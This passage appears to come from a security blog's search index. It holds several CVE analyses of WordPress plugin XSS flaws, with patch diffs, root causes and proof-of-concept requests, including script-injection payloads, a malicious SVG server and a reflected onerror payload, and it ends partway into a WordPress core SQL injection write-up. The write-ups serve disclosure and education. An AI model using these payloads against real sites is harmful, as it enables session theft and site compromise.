type=\"text/css\"\u003e\u003c/style\u003e tag. The Manage_Styles class registers a REST API route in the register_routes function: public function register_routes( $namespace ){ register_rest_route( $namespace, 'save_css', [ [ 'methods' =\u003e 'POST', 'callback' =\u003e [ $this, 'save_block_css' ], 'permission_callback' =\u003e [ $this, 'permission_check' ], 'args' =\u003e [] ] ] ); // other route } register_rest_route() creates a REST API endpoint at: /wp-json/{namespace}/save_css When a POST request is made to this endpoint: Word","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect XSS Use a user with the contributor role to create any post and note its ID. Send a POST request to http://localhost/wp-json/woolentor/v1/save_css with an XSS payload: POST /wp-json/woolentor/v1/save_css HTTP/1.1 Host: localhost Content-Type: application/json { \"post_id\":1416, \"has_block\":true, \"block_css\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } Response 👉 The X-WP-Nonce header is missing for user authorization. Open the page source (Ctrl+U) of the post edit page: view-source:http://localhost/wp-admin/post.php?post=\u003cpost_id\u003e\u0026action=edit Search for wpApiSettings in the source and extract the nonce value. wpApiSettings Send the request including the X-WP-Nonce header with the obtained value: POST /wp-json/woolentor/v1/save_css HTTP/1.1 Host: localhost X-WP-Nonce: f79ec79e4b Content-Type: application/json { \"post_id\":1416, \"has_block\":true, \"block_css\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } Preview post Preview 👉 XSS succeeds. Inspect to see how the code was modified. View source code Code ","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#detect-xss"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-58990 vulnerability in ShopLentor \u003c= 3.2.0 allows a contributor to inject malicious CSS leading to Stored XSS when an admin/author previews or views the post. The 3.2.1 patch adds permission checks and CSS sanitization to prevent exploitation. Key takeaways: Always combine permission checks and input sanitization when handling user-submitted data. Low-privilege roles (like contributor) can still be an attack vector if APIs are not properly protected. Stored XSS in WordPress commonly occurs when data saved to DB/files is rendered inline without sanitization. Timely plugin updates are a simple and effective mitigation. ","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References Cross-site scripting (XSS) cheat sheet WordPress ShopLentor Plugin \u003c= 3.2.0 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Authorsy Plugin.","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability exists in the Authorsy plugin for WordPress prior to version 1.0.6. This could allow an attacker to inject malicious code (e.g., redirect scripts, ads, or other HTML payloads) into the website, which would execute when visitors open the page. CVE ID: CVE-2025-27006 Product: WordPress Authorsy Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 1.0.5 CVSS severity: Medium (6.5) OWASP Top 10: A1: Broken Access Control Required Privilege: Subscriber Although the description requires Subscriber privileges, it can actually be exploited Unauthenticated. ","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Authorsy: v1.0.5 (vulnerable) and v1.0.6 (patched) Diff tool: meld or any tool to compare two versions ","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin allows custom CSS, stores it in wp_options, and injects it directly into the \u003cstyle\u003e tag on pages. However, users can interact with the API to modify CSS without proper access control, leading to Broken Access Control and potential XSS if malicious payloads are inserted. ","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff Use a diff tool to compare vulnerable and patched versions. Notice clear differences in two files: core/settings/api-settings.php and core/enqueue-inline/enqueue-inline.php. File core/enqueue-inline/enqueue-inline.php public function custom_inline_css() { $custom_css = ''; $ea_custom_css = authorsy_get_option('ea_custom_css'); if(is_single()){ $custom_css.= $ea_custom_css; } $custom_css .= \" :root { --ea-color-main: $primary_color; } \" wp_add_inline_style('authorsy-custom-css', $custom_css); } User data is inserted without validation, leaving it vulnerable to XSS. Patched version: public function custom_inline_css() { $custom_css = ''; $ea_custom_css = authorsy_get_option('ea_custom_css'); if(is_single() \u0026\u0026 !empty($ea_custom_css)){ // Sanitize and escape to prevent XSS $ea_custom_css = wp_strip_all_tags($ea_custom_css); $ea_custom_css = esc_html($ea_custom_css); $custom_css.= $ea_custom_css; } $custom_css .= \" :root { --ea-color-main: $primary_color; } \" wp_add_inline_style('authorsy-custom-css', $custom_css); } Sanitization ensures only safe CSS is injected. Diff showing changes in enqueue-inline.php to sanitize custom CSS File core/settings/api-settings.php Vulnerable: 'permission_callback' =\u003e function () { return true; }, Patched: 'permission_callback' =\u003e function () { return current_user_can('manage_options'); }, The permission callback now restricts access to admins, mitigating Broken Access Control and indirectly reducing XSS risk. Diff showing REST API permission callback changes in api-settings.php ","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works custom_inline_css() is hooked to wp_head. When WordPress renders the \u003chead\u003e section, this function concatenates user options from authorsy_get_option() into $custom_css and adds it inline: $custom_css = authorsy_get_option('ea_custom_css'); Since this data is stored in the database, this is Stored XSS. ","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit Send a POST request to /wp-json/authorsy/v1/settings with an XSS payload: POST /wp-json/authorsy/v1/settings HTTP/1.1 Host: localhost Content-Type: application/json { \"primary_color\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } The payload closes the existing \u003cstyle\u003e and injects a \u003cscript\u003e tag. Visiting any page will execute the XSS. Injected XSS payload in via custom CSS \u003cstyle\u003e :root { --ea-color-main: \u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e; } \u003c/style\u003e ","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/:2:3","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-27006 vulnerability in Authorsy \u003c= 1.0.5 demonstrates Broken Access Control combined with XSS. Root causes: REST API lacks proper access control (permission_callback always true). Custom CSS is inserted without sanitization, enabling injection of \u003cscript\u003e tags. Nonce verification does not stop execution when invalid, making security checks ineffective. Key takeaways: Always use proper permission_callback to prevent Broken Access Control. Sanitize and escape user input before rendering in HTML/CSS/JS to prevent XSS. ","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References Cross-site scripting (XSS) cheat sheet WordPress Authorsy Plugin \u003c= 1.0.5 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Assistant Plugin.","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability exists in the Assistant plugin for WordPress prior to version 3.6.2. This could allow an attacker to inject malicious code (e.g., redirect scripts, ads, or other HTML payloads) into the website, which would execute when visitors open the page. CVE ID: CVE-2025-53307 Product: WordPress Assistant Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 1.5.2 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated ","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Assistant: v1.5.2 (vulnerable) and v1.5.3 (patched) Diff tool: meld or any tool capable of comparing two versions ","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The application displays user-provided image content directly via a URL without validating or fully checking the MIME type. This allows an attacker to supply a file disguised as an image, which when processed by the browser, executes malicious code → resulting in an XSS vulnerability. ","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff Use any diff tool to compare the vulnerable version and the patch. Diff between vulnerable and patched version In this case, there are significant differences between the two versions. For easier tracking, the change log identifies where the XSS patch was applied: Changelog 1.5.3 (2025-09-08) - Changes to support the integration of Assistant in Beaver Builder version 2.10 - Fixed dark mode issues on the Home app and sidebar. - Security: Fixed a potential XSS vulnerability in the \"image proxy\" 👉 The vulnerability is located in backend/src/Hooks/ImageProxy.php. Observing the differences between the two versions: Differences in the render_image function of ImageProxy.php The changes occur in the render_image function, which: Accepts a URL parameter from the query string ($_GET['url']). Sends a request from the server to that URL to fetch the content. Prevents SSRF using wp_safe_remote_get. If the content has a Content-Type header starting with image/, then: Sends the same Content-Type header back to the client. Echoes the file content to the browser. The browser displays the image not directly from the original source but through the WordPress server. SVG files also have a Content-Type starting with image/ and can contain embedded JavaScript → XSS can occur. The patch added an additional check to verify the actual MIME type of the file to prevent XSS via SVG or maliciously disguised files. $filesystem = self::filesystem(); $tmpfile = tempnam( '/tmp', 'assistant' ); $filesystem-\u003eput_contents( $tmpfile, $body ); $validimage = wp_get_image_mime( $tmpfile ); $filesystem-\u003edelete( $tmpfile ); if ( ! $validimage ) { return false; } wp_get_image_mime() uses internal image processing (based on the binary data of the file) to determine the actual MIME type. If the result is not a valid image → returns false. ","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works In the __construct of the ImageProxy class, the render_image() method is called via the 'init' action hook. The 'init' hook runs early in WordPress loading, after core objects are initialized but before output is sent to the browser. render_image is called only if the current user has permission to edit other users’ posts and the $_GET['fl_asst_image_proxy'] parameter exists. 👉 Accessing /wp-admin/?fl_asst_image_proxy=value1\u0026url=http://yoursite/image-path triggers render_image and returns the image content to the browser. ","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect XSS Create a simple web page returning an SVG containing an XSS payload: from flask import Flask, Response app = Flask(__name__) @app.route('/') def home(): return 'Hello, World!' @app.route('/svg') def about(): svg = \"\"\"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003csvg xmlns=\"http://www.w3.org/2000/svg\"\u003e \u003cscript\u003ealert(document.domain)\u003c/script\u003e \u003c/svg\u003e\"\"\" return Response(svg, mimetype=\"image/svg+xml\") Send a request with the url parameter pointing to https://yoursite/svg: http://localhost/wp-admin/?fl_asst_image_proxy=abc\u0026url=https://yoursite/svg 👉 Successful for Unauthenticated because as long as the user has permission, accessing the URL triggers XSS in the victim’s browser. The attacker does not need to log in. SVG with XSS payload displayed via image proxy ","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#detect-xss"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-53307 vulnerability in the WordPress Assistant plugin (\u003c= v1.5.2) allows XSS via render_image() because it does not validate the actual file MIME type. Version v1.5.3 patched this by verifying the file content before returning it to the browser. Key takeaways: Do not trust the Content-Type header from HTTP responses. Always validate the actual MIME type of the file. ","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References Cross-site scripting (XSS) cheat sheet WordPress Assistant Plugin \u003c= 1.5.2 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Hostel Plugin.","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability exists in the Hostel plugin for WordPress prior to version 1.1.5.8. An attacker could exploit it to target high-privilege users like admins. CVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated ","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Hostel Plugin: v1.1.5.7 (vulnerable) and v1.1.5.8 (patched) Diff tool: meld or any tool that can compare two versions ","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The root cause is the lack of sanitization and escaping for a parameter before rendering it on the page, leading to a Reflected Cross-Site Scripting (XSS) vulnerability. ","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff Use any diff tool to compare the vulnerable version and the patch. The differences are clearly in two files: views/bookings.html.php and controllers/bookings.php File views/bookings.html.php \u003cp align=\"center\"\u003e \u003c?php if($offset \u003e 0):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset - $page_limit?\u003e\u0026ob=\u003c?php echo @$_GET['ob']?\u003e\"\u003e\u003c?php _e('[previous page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset + $page_limit?\u003e\u0026ob=\u003c?php echo @$_GET['ob']?\u003e\"\u003e\u003c?php _e('[next page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c/p\u003e The parameter ob is directly taken from $_GET['ob'] and echoed into an HTML attribute without escaping, making it vulnerable to Reflected XSS, since an attacker can inject payloads into the query string. Patched Code \u003cp align=\"center\"\u003e \u003c?php if($offset \u003e 0):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset - $page_limit?\u003e\u0026ob=\u003c?php echo esc_attr($_GET['ob'] ?? '')?\u003e\"\u003e\u003c?php _e('[previous page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset + $page_limit?\u003e\u0026ob=\u003c?php echo esc_attr($_GET['ob'] ?? '')?\u003e\"\u003e\u003c?php _e('[next page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c/p\u003e The patch uses esc_attr() to safely encode $_GET['ob'] before echoing into the HTML attribute. Diff showing patched and vulnerable code Source: $_GET['ob'] is client-controlled input from the URL query string. Sink: echoed in an HTML attribute ob=\u003c?php echo @$_GET['ob']?\u003e. 👉 Because the source does not go through controller logic, the diff of controllers/bookings.php is less relevant. ","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works For $_GET['ob'] to be echoed in the HTML attribute of \u003ca\u003e, the if condition enclosing \u003ca\u003e must be true: \u003c?php if($offset \u003e 0):?\u003e // ob=\u003c?php echo @$_GET['ob']?\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e // ob=\u003c?php echo @$_GET['ob']?\u003e \u003c?php endif;?\u003e 👉 The key condition is if($offset \u003e 0). If true, the XSS can occur regardless of the second condition. The views/bookings.html.php file cannot be accessed directly; it must be included by the controller using include(). The $offset variable is initialized in the controller and passed to the view. Searching the plugin controllers shows that $offset is set in the default branch (listing bookings) of the static manage() method in class WPHostelBookings in controllers/bookings.php. Controller Code class WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET['do']) { // other logic // list bookings default: $type = empty($_GET['type']) ? 'upcoming' : sanitize_text_field($_GET['type']); $offset = empty($_GET['offset']) ? 0 : intval($_GET['offset']); $dir = empty($_GET['dir']) ? 'ASC' : $_GET['dir']; if($dir != 'ASC' and $dir != 'DESC') $dir = 'ASC'; $odir = ($dir == 'ASC') ? 'DESC' : 'ASC'; $page_limit = 20; $limit_sql = empty($_GET['export']) ? $wpdb-\u003eprepare(\"LIMIT %d, %d\", $offset, $page_limit) : ''; $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); $count = $wpdb-\u003eget_var(\"SELECT FOUND_ROWS()\"); if(@file_exists(get_stylesheet_directory().'/wphostel/bookings.html.php')) include get_stylesheet_directory().'/wphostel/bookings.html.php'; else include(WPHOSTEL_PATH.\"/views/bookings.html.php\"); break; } } } Analysis of $offset $offset comes from the URL parameter $_GET['offset']: Absent → defaults to 0 Present → cast to integer via intval() $offset = empty($_GET['offset']) ? 0 : intval($_GET['offset']); Analysis of $page_limit $page_limit is fixed at 20 for pagination $page_limit = 20; $limit_sql = empty($_GET['export']) ? $wpdb-\u003eprepare(\"LIMIT %d, %d\", $offset, $page_limit) : ''; This ensures SQL returns up to 20 records starting from $offset. XSS condition in view: The payload displays only if if($offset \u003e 0) → requires at least 1 offset Exploit requires at least 2 bookings in the database to render payload The controller passes results to the view using: if(@file_exists(get_stylesheet_directory().'/wphostel/bookings.html.php')) include get_stylesheet_directory().'/wphostel/bookings.html.php'; else include(WPHOSTEL_PATH.\"/views/bookings.html.php\"); WPHOSTEL_PATH is the absolute path to the plugin directory. Absolute path to the plugin directory ","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit Request with XSS payload GET /wp-admin/admin.php?page=wphostel_bookings\u0026type=upcoming\u0026offset=1\u0026ob=\"\u003e\u003cimg+src%3D1+onerror%3Dalert%28document.domain%29\u003e HTTP/1.1 Payload \"\u003e\u003cimg src=x onerror=alert(document.domain)\u003e Closes \u003ca\u003e tag with \"\u003e Adds \u003cimg\u003e tag with onerror to trigger JavaScript Uses alert(document.domain) to clearly demonstrate DOM access Result Reflected XSS triggered successfully ","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-6234 vulnerability in the WordPress Hostel plugin stems from improper handling of input ($_GET['ob']) before rendering. This allows an attacker to inject Reflected XSS. The patch fixes it by using esc_attr() to escape the input, ensuring untrusted values cannot inject malicious scripts. Key takeaways: Always sanitize input and escape output according to context. In WordPress, leverage built-in functions like sanitize_text_field(), esc_attr(), esc_html(), wp_kses() to mitigate security risks. ","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References XSS Cross-site scripting (XSS) cheat sheet - PortSwigger WordPress Hostel Plugin \u003c 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack ","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Core.","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/"},{"categories":["CVE Analysis"],"collections":null,"content":"Due to improper data sanitization in WP_Query, it is possible in certain cases to perform an SQL Injection through plugins or themes that use it in a particular way. This vulnerability was patched in WordPress version 5.8.3. Older affected versions were also fixed through security releases going back as far as 3.7.37. CVE ID: CVE-2022-21661 Product: WordPress Vulnerability Type: SQL Injection Affected Versions: 3.7.37 ≤ version \u003c 5.8.3 CVSS severity: High (8.0) ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. WordPress: v5.8.2 (vulnerable) ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Setup ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#setup"},{"categories":["CVE Analysis"],"collections":null,"content":"Required PHP Version WordPress is entirely built in PHP, so the PHP version on the server directly affects its operation: Each PHP version introduces new features and deprecates or removes outdated syntax/functions. If WordPress uses features not supported by an old PHP version → syntax errors or execution failure may occur. Conversely, if PHP is too new, some older functions used by WordPress might be deprecated or removed, causing runtime errors. 👉 Therefore, the PHP version must be compatible with the WordPress version. In this analysis, we use PHP 7.4 with WordPress 5.8.2. ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#required-php-version"},{"categories":["CVE Analysis"],"collections":null,"content":"VSCode Extensions Because WordPress source code is complex, reading it line by line manually is not practical. To assist with debugging and tracing, install the following extensions in VS Code: PHP Extension Pack → search keyword: xdebug.php-pack PHP Tools for VS Code → search keyword: devsense.phptools-vscode ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#vscode-extensions"},{"categories":["CVE Analysis"],"collections":null,"content":"Custom Plugin Since this SQLi vulnerability affects the WordPress Core but can only be exploited indirectly through plugins or themes that use WP_Query, we must interact with it via such a plugin or theme. We create a plugin using WP_Query, displaying the SQL query executed through WP_Query::request. \u003c?php /** * Plugin Name: Demo WP_Query * Description: Demo plugin for WP_Query * Version: 1.0 * Author: w41bu1 */ if (!defined('ABSPATH')) exit; function da_show_posts() { $args = [ 'post_type' =\u003e 'post', 'tax_query' =\u003e [ [ 'taxonomy' =\u003e 'category', 'field' =\u003e 'term_taxonomy_id', 'terms' =\u003e [1,2,3], 'operator' =\u003e 'IN', ], ], ]; $query = new WP_Query($args); ob_start(); echo '\u003ch3\u003eDemo WP_Query\u003c/h3\u003e'; echo '\u003cpre style=\"background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; overflow:auto;\"\u003e'; echo \"SQL query generated by WP_Query:\\n\\n\"; echo esc_html($query-\u003erequest); echo '\u003c/pre\u003e'; if ($query-\u003ehave_posts()) { echo '\u003cul\u003e'; while ($query-\u003ehave_posts()) { $query-\u003ethe_post(); echo '\u003cli\u003e' . get_the_title() . ' (' . get_the_ID() . ')\u003c/li\u003e'; } echo '\u003c/ul\u003e'; } else { echo '\u003cp\u003eNo posts found.\u003c/p\u003e'; } wp_reset_postdata(); return ob_get_clean(); } add_shortcode('demo_wp_query', 'da_show_posts'); Taxonomy parameters Create a new page with \u003cpage-title\u003e containing the shortcode: [demo_wp_query] 👉 The query will be displayed when visiting http://localhost/\u003cpage-title\u003e Demo page displaying WP_Query output ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:2:3","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#custom-plugin"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis wpdb Core PHP class used by WordPress to directly interact with MySQL. Allows developers to write and execute raw SQL queries. WP_Query An abstraction layer that retrieves post data from the database without writing raw SQL. Developers simply pass an array of parameters (args), and WordPress automatically builds the appropriate SQL. Relationship WP_Query doesn’t directly query MySQL. Instead, it builds SQL based on the arguments, applies validation/sanitization, and then calls $wpdb to execute it. ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 